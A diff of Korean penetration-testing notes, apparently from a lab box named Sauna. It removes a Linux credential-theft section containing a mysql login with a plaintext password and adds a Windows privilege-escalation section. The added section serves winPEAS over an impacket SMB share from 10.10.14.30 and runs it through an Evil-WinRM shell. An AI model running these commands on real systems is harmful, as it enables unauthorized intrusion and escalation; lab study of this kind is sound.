@@ -1,14 +1,18 @@
-# 리눅스 자격증명 훔치기
+# 자동 실행을 통한 권한 상승
 
-### Mysql
+## 시스템  내부
 
-* Mysql에 연결하기 위해선 자격증명(아이디, 비밀번호 필요)
-
-```bash
-mysql -u zabbix -pbloooarskybluh #mysql 연결 
-```
+WinPEAS : 윈도우 호스트에서 권한을 에스컬레이션할 수 있는 가능한 경로를 검색하는 스크립트
 
 ```bash
-//Mysql 명령어
-show databases; #데이터베이스 보여주기
+#파일 공유 서비스 실행
+python3 smbserver.py -username df -password df share . -smb2support
+
+#파일 다운로드
+*Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
+The command completed successfully.
+*Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
+*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>
+*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast
 ```
+
